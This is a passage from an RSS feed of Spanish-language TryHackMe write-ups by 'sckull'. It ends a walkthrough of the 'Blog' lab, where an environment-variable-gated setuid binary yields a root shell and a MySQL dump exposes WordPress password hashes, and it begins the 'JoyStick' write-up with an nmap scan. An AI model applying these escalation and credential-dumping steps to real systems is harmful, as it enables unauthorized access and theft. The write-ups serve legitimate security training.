&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;undefined8&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcVar1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  
  &lt;span class=&#34;n&#34;&gt;pcVar1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pcVar1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Not an Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la maquina creamos la variable &lt;code&gt;$admin&lt;/code&gt; a quien le pasamos un directorio cualquiera, ejecutamos el ejecutable y logramos obtener una shell con usuario root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_190334.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Finalmente, buscamos la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_190921.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;database-blog&#34;&gt;DATABASE BLOG&lt;/h3&gt;
&lt;p&gt;Logramos entrar al servicio de mysql sin credenciales utilizando el usuario root, donde encontramos las credenciales de los usuarios de la base de datos de wordpress (blog).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Database           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; information_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; blog               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mysql              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; performance_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sys                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

+-----------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Tables_in_blog        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-----------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_commentmeta        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_comments           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_links              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_options            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_postmeta           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_posts              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_term_relationships &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_term_taxonomy      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_termmeta           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_terms              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_usermeta           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wp_users              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-----------------------+
&lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

mysql&amp;gt; describe wp_users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+---------------------+---------------------+------+-----+---------------------+----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Field               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Type                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Default             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Extra          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------------------+---------------------+------+-----+---------------------+----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ID                  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bigint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; unsigned &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; PRI &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; auto_increment &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_login          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;60&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_pass           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_nicename       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;50&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_email          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; MUL &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_url            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_registered     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; datetime            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 0000-00-00 00:00:00 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_activation_key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_status         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; display_name        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;250&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NO   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------------------+---------------------+------+-----+---------------------+----------------+
&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

mysql&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from wp_users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ID &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_login &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_pass                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_nicename &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_email                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_url &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_registered     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_activation_key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_status &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; display_name  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bjoel      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$P$BjoFHe8zIyjnQe&lt;/span&gt;/CBvaltzzC6ckPcO/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bjoel         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nconkl1@outlook.com          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2020-05-26 03:52:26 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Billy Joel    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; kwheel     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$P$BedNwvQ29vr1TPd80CDl6WnHyjr8te&lt;/span&gt;. &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; kwheel        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; zlbiydwrtfjhmuuymk@ttirv.net &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2020-05-26 03:57:39 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Karen Wheeler &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/blog/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/blog/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - JoyStick</title>
        <link>https://sckull.github.io/posts/joystick/</link>
        <pubDate>Wed, 22 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 22 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/joystick/</guid>
        <description>JoyStick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;JoyStick es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;JoyStick&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Anyone want to play?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jul 17 00:47:51 2020 as: nmap -sV -o nmap_scan_mini joystick.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; joystick.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.184.33&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 17 00:48:28 2020 -- 1 IP address (1 host up) scanned in 37.10 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Intentamos ingresar con credenciales de anonymous en el servicio de FTP pero nos muestra un mensaje de error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
